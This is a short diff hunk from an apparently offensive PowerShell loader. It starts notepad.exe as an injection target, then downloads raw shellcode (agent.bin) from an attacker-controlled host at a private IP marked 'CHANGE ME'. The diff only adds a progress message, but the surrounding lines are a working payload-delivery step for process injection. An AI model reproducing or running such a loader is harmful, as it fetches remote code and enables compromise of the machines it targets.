@@ -12,6 +12,7 @@ Write-Host "Started notepad.exe with PID: $procid"
 
 # Step 3: Download the raw shellcode from the remote server
 $url = "http://192.168.45.168/agent.bin" # CHANGE ME
+Write-Host "Shellcode Download in progress!"
 $shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 
 
